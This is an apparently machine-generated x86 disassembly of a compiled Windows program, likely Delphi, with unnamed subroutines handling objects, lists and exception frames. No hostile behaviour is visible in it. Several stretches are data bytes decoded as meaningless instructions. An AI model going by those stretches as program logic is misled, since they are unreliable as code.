push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40313c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x8 ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_467aac
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x18 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46e580
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
lea eax [ esi + 0x14 ]
call sub_40d3ac
lea eax [ esi + 0x18 ]
call sub_40d3ac
lea eax [ esi + 0x8 ]
call sub_40d3ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_46e5d8
push ebx
mov ebx eax
mov [ ebx + 0xc ] 0x0
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x9c ]
mov edx [ ebx + 0x14 ]
call sub_467f0c
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x68 ]
mov edx [ ebx + 0x14 ]
call sub_46addc
pop ebx
retn
sub_46e608
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e62d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e634
retn
sub_46e6d7
add [ eax ] dh
in al dx
inc ecx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax + 0x600046e7 ] dh
inc esi
add [ eax - 0x37ffb99c ] bl
inc esi
add ah bh
rol [ esi ] cl
cmp bl dl
inc esi
add ah dh
out 0x46 eax
add al dl
fiadd [ esi ]
sbb dh dl
popad
jne r-xdata
jb r-xdata
mov eax [ esi + 0xfc ]
call [ esi + 0xf8 ]
je r-xdata
inc esi
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax - 0x5bffbe7c ] ch
aad 0x46
add ah al
aad 0x46
add [ eax ] bh
jmp r-xdata
sar [ eax ] 0xe7
inc esi
add [ edi ] al
or eax 0x51644954
dec edi
push esp
inc esp
push ebx
jb r-xdata
mov bl 0x1
mov eax [ edi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
outsd
jb r-xdata
dec eax
fadd [ esi ]
xchg esp eax
fadd [ esi ]
pushad
fadd [ esi ]
or eax 0x51644954
dec edi
push esp
inc esp
push ebx
jb r-xdata
dec esp
stc
dec [ ebx + 0x33f08bda ]
ror [ ebx - 0x167a173a ] cl
jb r-xdata
mov eax [ edi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
cmp [ esi + 0xfa ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
inc edi
push 0x52ff108b
pop eax
mov eax eax
push ebx
push esi
test dl dl
je r-xdata
inc esi
add [ eax ] dh
fadd [ esi ]
inc eax
fadd [ esi ]
rcr dl 0x1
inc esi
add [ eax ] bl
salc
out 0x46 al
add [ eax ] cl
int3
mov edx edi
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46d150
mov edx 0x11
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46e7f4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov bl 0x1
mov eax [ edi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ edi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov eax ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0xfa ] 0x0
je r-xdata
mov edx edi
mov eax [ esi + 0xfc ]
call [ esi + 0xf8 ]
sub_46e830
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46e855
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e85c
retn
sub_46e88a
inc esi
add [ eax + eax + 0x61980000 ] al
inc esi
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edx + ebp * 8 ] bl
inc esi
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax - 0x53ffbe7c ] ch
0xe9f40046 0x41
sub_46e912
mov esp 0xa0046e9
push esp
dec ecx
push ebp
inc esp
push eax
inc edx
popad
jae r-xdata
inc edx
jne r-xdata
lea eax [ eax ]
sub cl ch
inc esi
add [ edi ] al
or dl [ ecx + ecx * 2 + 0x64 ]
push ebp
inc esp
push eax
inc edx
popad
jae r-xdata
lea edi [ eax - 0x1 ]
inc edi
inc esi
insb
add [ eax ] ah
add [ eax ] al
jb r-xdata
in eax dx
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x72421000
mov ah 0xe8
inc esi
add [ eax ] dh
bound eax [ esi ]
push es
add [ ecx ] cl
dec ecx
push ebp
inc esp
push eax
inc edx
popad
jae r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] 0x0
[ eax ]
mov [ esi + 0x7c ] 0xfffffffe
mov eax esi
test bl bl
je r-xdata
outsb
popad
bound ebp [ ebp + 0x64 ]
nop
xor ecx ecx
mov dl [ eax + 0x80 ]
call sub_46ed44
retn
outsd
popad
arpl [ fs : ecx + 0x73 ] sp
je r-xdata
add eax [ eax ]
add [ eax ] dl
inc eax
add [ eax ] al
add dh bh
fsub st4
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
cmp al 0x10
inc eax
add [ eax + eax ] ch
[ eax + eax ]
sub_46e976
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x20
add [ eax ] al
add al 0x0
or al [ edx + 0x75 ]
jb r-xdata
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] 0x0
[ eax ]
in eax dx
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x72421000
outsd
popad
arpl [ fs : ecx + 0x73 ] sp
je r-xdata
mov [ esi + 0x7c ] 0xfffffffe
mov eax esi
test bl bl
je r-xdata
outsb
popad
bound ebp [ ebp + 0x64 ]
nop
xor ecx ecx
mov dl [ eax + 0x80 ]
call sub_46ed44
retn
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46e9d8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_466280
mov [ esi + 0x6c ] 0x2000
mov [ esi + 0x7c ] 0xfffffffe
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46ea1c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46ecdc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_466318
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_46ea68
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov eax [ ebx + 0x68 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_466e58
mov [ ebx + 0x68 ] eax
mov eax [ ebx + 0x68 ]
pop esi
pop ebx
retn
xor ecx ecx
mov edx 0x2
call sub_466a24
mov eax ebx
mov si 0xffef
call sub_403368
sub_46eac8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0x10 ]
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx esi
call sub_466eb0
test al al
jne r-xdata
mov esi [ ebx + 0x7c ]
push 0x0
push edi
mov eax [ ebp + 0xc ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_463abc
xor ebx ebx
mov eax edi
call sub_403f40
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_46eb40
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
mov eax ebx
mov edx [ esi + 0x6c ]
call sub_40458c
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx ]
call sub_404200
push eax
mov eax ebx
call j_sub_40440c
mov edx eax
mov eax esi
pop ecx
call sub_46eac8
mov edx ebx
xchg edx eax
call sub_40458c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_46eb90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ebd7
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push edi
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_46eb40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ebde
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_46ebe8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_46ec41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404400
push eax
mov eax esi
call sub_404200
push eax
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46ec50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ec48
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_46ec50
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_46eccb
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_463c08
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_403fd8
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_466b84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ecd2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
sub_46ecdc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x10
jne r-xdata
mov [ esi + 0x70 ] bl
test [ esi + 0x1c ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
sub_46ed18
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x80 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x80 ] dl
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
mov eax ebx
mov si 0xffef
call sub_403368
sub_46ed44
push ecx
cmp dl 0x1
cmc
sbb edx edx
mov [ esp ] edx
test ecx ecx
jne r-xdata
mov eax esp
push eax
push 0x4
mov edx 0xffff
mov eax ecx
mov ecx 0x20
call sub_466b44
pop edx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov ecx eax
sub_46ed74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46ed99
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46eda0
retn
sub_46ee0c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
out dx al
inc esi
add [ eax + eax ] bh
add ah dl
mov dl 0x46
add [ ebx + esi - 0x1cdbffc0 ] dh
inc ecx
add ah al
xor eax [ eax ]
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add al dh
inc esi
add al bl
jecxz r-xdata
imul esi [ ebx + 0x74 ] 0x72656e65
push esp
push 0x64616572
lea eax [ eax ]
hlt
add [ eax ] ch
mov ah 0x46
add [ esp + esi * 4 ] bl
inc esi
add [ esp + esi * 4 ] ah
inc esi
add [ eax ] ah
mov ah 0x46
add [ eax ] bl
mov ah 0x46
add ah bl
mov bh 0x46
add [ eax - 0x5bffb949 ] bh
mov bh 0x46
add [ eax ] ah
inc esi
add [ ebp + esi * 4 - 0x499bffba ] dl
inc esi
add ah al
mov dh 0x46
add al dl
mov bh 0x46
add [ ebx + esi * 4 + 0x54140046 ] bl
dec ecx
push ebp
inc esp
push eax
dec esp
sub_46eea9
out dx al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x11 ] al
inc esi
add [ eax - 0x11 ] cl
inc esi
add [ eax + eax - 0x17980000 ] ah
inc esi
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ ecx + esi * 8 ] dl
inc esi
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax - 0x53ffbe7c ] ch
0xe9f40046 0x41
sub_46ef46
inc esi
add [ esp + edx * 2 ] cl
dec ecx
push ebp
inc esp
push eax
push ebx
jb r-xdata
jb r-xdata
jb r-xdata
mov [ eax ] al
add [ eax ] al
lodsb [ esi ]
in eax dx
inc esi
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi + 0x31040040 ] bh
inc eax
add [ eax ] ah
xor [ eax ] eax
adc al 0xf1
inc esi
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax - 0x53ffbe7c ] ch
0xe9f40046 0x41
inc eax
add [ edi + ebp * 8 + 0x46 ] bl
add [ edi ] al
or al 0x54
call sub_467260
mov ecx eax
mov dl [ ebx + 0x80 ]
mov eax ebx
call sub_46ed44
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
retn
or [ eax - 0x18000000 ] 0x68
fwait
cli
dec [ ebx - 0x97ab110 ]
jl r-xdata
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090008 ] al
outsb
push ebp
inc esp
push eax
push edx
popad
add [ fs : eax ] dl
inc eax
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
or eax 0x65726854
popad
inc ebp
jbe r-xdata
jb r-xdata
mov eax [ ebx + 0x90 ]
call sub_41e634
lea eax [ ebx + 0x90 ]
call sub_40d3ac
xor eax eax
mov [ ebx + 0x8c ] eax
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
add [ edx + esi * 8 + 0x46 ] dl
add [ edx + esi * 8 + 0x10046 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ ebx ] cl
inc esp
popa
jne r-xdata
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x8c ] 0x0
je r-xdata
dec ecx
push ebp
inc esp
push eax
push ebx
jb r-xdata
out dx al
inc esi
add [ ecx + ebp * 8 ] ah
inc esi
add [ edx ] cl
add [ ebx ] cl
dec ecx
push ebp
inc esp
push eax
push ebx
jb r-xdata
mov edx edi
mov eax [ ebx + 0x88 ]
call sub_467260
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc edi
dec esi
jne r-xdata
je r-xdata
mov eax [ ebx + 0x88 ]
call sub_418bec
mov esi eax
dec esi
test esi esi
jl r-xdata
add [ eax ] al
jmp [ eax + 0x1ff0000 ]
jb r-xdata
outsd
inc esi
xor edi edi
add [ eax + 0x74ff0000 ] cl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080006 ] al
imul ebp [ esi + 0x64 ] 0x73676e69
cmp al 0x10
inc eax
add [ esi ] bh
inc esi
sub_46f0c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46e9d8
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_467224
mov [ esi + 0x88 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46f114
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46ecdc
lea eax [ esi + 0x88 ]
call sub_40d3ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46ea1c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_46f170
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_46ea4c
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov esi [ ebx + 0x8c ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
jne r-xdata
sub_46f19c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x8c ] 0x0
jne r-xdata
mov eax [ ebx + 0x8c ]
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x88 ]
call sub_418bec
dec eax
jge r-xdata
mov eax [ ebx + 0x88 ]
call sub_418bec
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x88 ]
call sub_4671c4
xor edx edx
mov eax [ ebx + 0x88 ]
call sub_467260
mov [ ebx + 0x8c ] eax
push ebx
mov ecx [ ebx + 0x6c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46f290
mov esi eax
mov [ ebx + 0x90 ] esi
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax ebx
mov si 0xffef
call sub_403368
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x88 ]
call sub_467260
xor ecx ecx
mov edx 0x2
call sub_466a24
mov edx esi
mov eax [ ebx + 0x88 ]
call sub_467260
call sub_466c80
inc esi
dec edi
jne r-xdata
sub_46f290
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov cl 0x1
xor edx edx
mov eax edi
call sub_46b594
mov [ edi + 0x6c ] 0x3e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ edi + 0x70 ] eax
mov [ edi + 0x74 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x78 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46f2f0
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x70 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46b62c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_46f320
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46f52f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_46f512
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov eax [ eax + 0x88 ]
call sub_418bec
mov edx eax
mov eax [ ebp - 0x14 ]
call sub_418050
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov eax [ eax + 0x88 ]
call sub_418bec
dec eax
test eax eax
jl r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f519
mov eax [ ebp - 0x14 ]
call sub_40316c
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov eax [ eax + 0x88 ]
mov edx [ ebp - 0xc ]
call sub_467260
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_417d38
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_417e94
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov eax [ eax + 0x88 ]
call sub_4671e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x74 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
push eax
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ebx [ eax ]
call [ ebx + 0x4c ]
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_463abc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_41a3e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_466da0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_46f540
mov eax [ ebp - 0x4 ]
call sub_46b7e8
mov eax [ ebp - 0x4 ]
call sub_46f540
jmp r-xdata
xor eax eax
push ebp
push j_sub_40360c#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46b72c
test al al
jne r-xdata
sub_46f4eb
call sub_403974
xor eax eax
push ebp
push j_sub_40360c#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46b72c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f519
mov eax [ ebp - 0x14 ]
call sub_40316c
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_417e94
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov eax [ eax + 0x88 ]
call sub_4671e4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x74 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x74 ]
push eax
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
mov ebx [ eax ]
call [ ebx + 0x4c ]
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_463abc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_41a3e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_466da0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_46f540
mov eax [ ebp - 0x4 ]
call sub_46b7e8
mov eax [ ebp - 0x4 ]
call sub_46f540
jmp r-xdata
sub_46f550
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46f575
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f57c
retn
sub_46f58c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0xf6
inc esi
add [ eax - 0xa ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dh
test [ esi ] 0x88
add [ eax ] al
add [ eax - 0x18 ] ch
inc esi
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edx + ebp * 8 ] bl
inc esi
add [ ebp + eax * 4 - 0x15afffbf ] cl
inc ecx
add [ eax - 0x53ffbe7c ] ch
0xe9f40046 0x41
sub_46f6d8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_46f71f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x78 ]
mov edx [ ebx + 0x74 ]
mov eax ebx
call sub_46ebe8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f726
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_46f72c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46f751
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f758
retn
sub_46f764
